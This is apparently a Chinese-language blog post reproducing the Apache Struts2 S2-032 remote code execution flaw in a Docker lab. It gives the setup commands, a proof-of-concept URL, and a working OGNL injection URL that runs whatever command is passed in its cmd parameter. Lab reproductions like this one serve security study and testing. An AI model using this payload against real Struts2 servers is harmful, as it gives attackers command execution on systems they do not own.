---
title: Struts2 S2-032远程代码执行漏洞
category: 
- 渗透测试
tags: 
- Docker
- 漏洞复现

---

### 漏洞概述

- [影响版本](http://struts.apache.org/docs/s2-032.html)

### 漏洞环境搭建

- 拉取镜像到本地

```bash
$ docker pull medicean/vulapps:s_struts2_s2-032
```

- 启动环境

```bash
$ docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-032
```

<!-- more -->

### 漏洞利用

- 访问 `http://你的 IP 地址:端口号/`

- Poc

```python
http://127.0.0.1/memoindex.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(%23parameters.content[0]%2b602%2b53718),1?%23xx:%23request.toString&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=10086
```

若页面显示：`1008660253718` 则代表可代码执行。

![image-20201201133452891](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201201133452891.png)

- exp

执行命令(所执行的命令在cmd参数处指定)：

```python
http://127.0.0.1/memoindex.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=uname
```

![image-20201201133611336](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201201133611336.png)

![image-20201201133626498](https://cdn.jsdelivr.net/gh/John-tlh/blog/images/2020image-20201201133626498.png)

- 利用过程

- 启动kali
- 使用docker搭建漏洞环境
- 开始利用

### 参考链接

[references](http://vulapps.evalbug.com/s_struts2_s2-032/)